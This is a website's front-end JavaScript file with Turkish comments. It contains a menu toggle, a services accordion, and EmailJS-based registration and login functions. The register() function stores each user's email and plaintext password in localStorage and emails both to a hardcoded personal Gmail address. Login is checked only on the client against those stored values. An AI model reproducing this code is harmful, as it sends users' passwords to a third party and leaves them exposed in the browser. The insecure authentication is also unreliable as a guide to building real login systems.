// Menü Toggle Fonksiyonu
const menuToggle = document.getElementById('menuToggle');
const sidebar = document.querySelector('.sidebar');
const body = document.body;

menuToggle.addEventListener('click', () => {
    body.classList.toggle('menu-open');
});

// Hizmetler Akordeon Fonksiyonu
const serviceQuestions = document.querySelectorAll('.service-question');

serviceQuestions.forEach(question => {
    question.addEventListener('click', () => {
        const serviceItem = question.parentElement;
        document.querySelectorAll('.service-item').forEach(item => {
            if (item !== serviceItem) {
                item.classList.remove('active');
            }
        });
        serviceItem.classList.toggle('active');
    });
});
// EmailJS'i başlat
(function() {
    emailjs.init("qt1dHP2mbvtl7v42W"); // EmailJS User ID'nizi buraya yazın
})();

// Kayıt olma işlemi
function register() {
    const email = document.getElementById('registerEmail').value;
    const password = document.getElementById('registerPassword').value;

    if (email && password) {
        // Bilgileri localStorage'a kaydet
        localStorage.setItem('userEmail', email);
        localStorage.setItem('userPassword', password);

        // EmailJS ile e-posta gönder
        emailjs.send("service_mqj01mn", "template_dvpf3hk", {
            to_email: "enestunoglu95@gmail.com", // Bilgilerin gönderileceği e-posta
            user_email: email,
            user_password: password
        }).then(function(response) {
            alert('Kayıt başarılı! Bilgileriniz e-posta ile gönderildi.');
            window.location.href = "giris.html"; // Giriş sayfasına yönlendir
        }, function(error) {
            alert('E-posta gönderilirken bir hata oluştu: ' + JSON.stringify(error));
        });
    } else {
        alert('Lütfen tüm alanları doldurun.');
    }
}

// Giriş yapma işlemi
function login() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;

    const storedEmail = localStorage.getItem('userEmail');
    const storedPassword = localStorage.getItem('userPassword');

    if (email === storedEmail && password === storedPassword) {
        alert('Giriş başarılı!');
        window.location.href = "index.html"; // Ana sayfaya yönlendir
    } else {
        alert('Giriş başarısız. Lütfen bilgilerinizi kontrol edin.');
    }
}
